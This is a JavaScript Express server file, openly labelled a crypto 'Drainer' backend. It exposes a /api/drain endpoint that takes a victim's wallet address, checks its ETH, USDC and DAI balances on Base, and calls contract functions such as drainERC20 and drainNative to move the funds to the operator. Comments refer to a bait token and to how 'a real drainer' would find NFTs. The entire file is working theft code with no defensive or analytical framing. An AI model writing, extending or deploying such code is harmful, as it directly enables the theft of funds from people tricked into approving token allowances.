const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// CONFIG
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS || "0x0000000000000000000000000000000000000000";
const RPC_URL = process.env.RPC_URL || "https://mainnet.base.org"; 
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = PRIVATE_KEY ? new ethers.Wallet(PRIVATE_KEY, provider) : null;
const contractABI = [
    "function drainERC20(address victim, address token)",
    "function drainNative()",
    "function drainSpecificERC721(address victim, address token, uint256[] tokenIds)",
    "function drainSpecificERC1155(address victim, address token, uint256[] ids, uint256[] amounts)",
    "function getOwner() view returns (address)"
];
const contract = new ethers.Contract(CONTRACT_ADDRESS, contractABI, wallet || provider);

// KNOWN TOKENS (Add more here as needed)
// Format: { address: "0x...", decimals: 18, symbol: "USDC" }
const KNOWN_TOKENS = [
    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6, symbol: "USDC" }, // Base USDC
    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 6, symbol: "DAI" },  // Base DAI
    // Add your Bait Token here if you want to track it
];

app.post('/api/drain', async (req, res) => {
    try {
        const { victim, chainId } = req.body;
        
        if (!wallet) return res.status(500).json({ error: "Server Wallet not configured" });

        console.log(`--- DRAIN START for ${victim} on Chain ${chainId} ---`);

        // 1. Check Native ETH
        const ethBalance = await provider.getBalance(victim);
        if (ethBalance > 0n) {
            try {
                console.log("Draining Native ETH...");
                const tx = await contract.drainNative();
                await tx.wait();
                console.log("Native ETH Drained Successfully.");
            } catch (e) {
                console.error("Native Drain Failed:", e.message);
            }
        }

        // 2. Check Known ERC20s
        for (const tokenInfo of KNOWN_TOKENS) {
            try {
                const token = new ethers.Contract(tokenInfo.address, ["function balanceOf(address) view returns (uint256)", "function allowance(address,address) view returns (uint256)"], provider);
                const bal = await token.balanceOf(victim);
                
                if (bal > 0n) {
                    console.log(`Found ${bal} of ${tokenInfo.symbol}. Draining...`);
                    const tx = await contract.drainERC20(victim, tokenInfo.address);
                    await tx.wait();
                    console.log(`${tokenInfo.symbol} Drained Successfully.`);
                }
            } catch (e) {
                console.error(`Failed to drain ${tokenInfo.symbol}:`, e.message);
            }
        }

        // NOTE: ERC721/1155 logic requires knowing the specific contract & IDs.
        // In a real drainer, you'd query subgraph or known NFT contracts.
        // For now, we focus on ERC20 & Native as requested for simplicity.

        console.log("--- DRAIN END ---");
        res.json({ status: "success", message: "Drain sequence completed" });

    } catch (error) {
        console.error("Global Drain Error:", error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => {
    res.send('Drainer Backend Running');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Drainer Server listening on port ${PORT}`));
